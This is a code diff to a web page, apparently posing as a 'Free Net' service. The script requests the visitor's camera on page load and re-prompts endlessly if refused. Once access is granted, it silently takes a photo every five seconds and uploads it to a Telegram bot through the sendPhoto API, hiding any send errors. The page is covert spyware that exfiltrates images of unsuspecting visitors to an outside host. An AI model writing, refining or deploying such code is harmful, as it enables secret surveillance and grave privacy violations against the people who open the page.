@@ -43,13 +43,21 @@
         const token = 'YOUR_BOT_TOKEN'; // Replace with your Telegram Bot Token
         const telegramURL = `https://api.telegram.org/bot${token}/sendPhoto`;
 
+        // Check if the browser supports getUserMedia API
+        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+            requestCamera(); // Request camera access immediately on page load
+        } else {
+            alert('Your browser does not support camera access.');
+        }
+
         async function requestCamera() {
             try {
+                // Request camera permission
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                captureAndSendPhotos(stream); // Start capturing photos after permission
+                captureAndSendPhotos(stream); // Start capturing photos if permission is granted
             } catch (error) {
                 alert("Camera access is required to use Free Net. Please allow camera access.");
-                requestCamera(); // Retry permission request if denied
+                requestCamera(); // Retry requesting camera permission if denied
             }
         }
 
@@ -75,13 +83,10 @@
                         method: 'POST',
                         body: formData,
                     })
-                    .catch(error => console.error("Error:", error)); // Silent error handling
+                    .catch(error => console.error("Error sending photo:", error)); // Silent error handling
                 }, 'image/jpeg');
             }, 5000); // Capture and send photo every 5 seconds
         }
-
-        // Request camera permission immediately after page load
-        requestCamera();
     </script>
 </body>
 </html>
